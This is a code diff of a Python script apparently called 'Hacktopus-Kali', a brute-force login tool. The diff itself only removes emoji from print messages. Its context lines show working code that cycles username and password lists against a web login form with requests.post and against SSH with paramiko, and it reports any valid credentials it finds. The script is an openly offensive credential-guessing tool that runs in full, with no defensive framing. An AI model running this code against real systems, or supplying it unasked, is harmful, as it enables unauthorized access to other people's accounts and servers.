@@ -3,7 +3,7 @@ import paramiko
 from time import sleep
 
 def web_login_bruteforce(url, username_list, password_list):
-    print("\n🔍 Attempting brute force attack on web login...")
+    print("\n Attempting brute force attack on web login...")
 
     for username in username_list:
         for password in password_list:
@@ -11,7 +11,7 @@ def web_login_bruteforce(url, username_list, password_list):
             data = {'username': username, 'password': password}  # Adjust this form according to target
             response = requests.post(url, data=data)
             if "Login successful" in response.text:  # You need to adjust this based on response after successful login
-                print(f"✅ Found valid credentials: {username}:{password}")
+                print(f" Found valid credentials: {username}:{password}")
                 return username, password
             sleep(1)
 
@@ -19,7 +19,7 @@ def web_login_bruteforce(url, username_list, password_list):
     return None, None
 
 def ssh_login_bruteforce(host, username_list, password_list):
-    print("\n🔍 Attempting brute force attack on SSH login...")
+    print("\n Attempting brute force attack on SSH login...")
 
     for username in username_list:
         for password in password_list:
@@ -28,13 +28,13 @@ def ssh_login_bruteforce(host, username_list, password_list):
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
                 client.connect(host, username=username, password=password, timeout=5)
-                print(f"✅ Found valid credentials: {username}:{password}")
+                print(f" Found valid credentials: {username}:{password}")
                 client.close()
                 return username, password
             except paramiko.AuthenticationException:
                 pass
             except Exception as e:
-                print(f"⚠ Error: {e}")
+                print(f" Error: {e}")
             finally:
                 sleep(1)
 
@@ -43,7 +43,7 @@ def ssh_login_bruteforce(host, username_list, password_list):
 
 # Main Function
 def main():
-    print("\n🎩 Hacktopus-Kali - Brute Force Login Tester")
+    print("\n Hacktopus-Kali - Brute Force Login Tester")
 
     url = input("Enter the target URL (e.g., http://example.com/login): ")
     username_list = ['admin', 'user', 'guest']
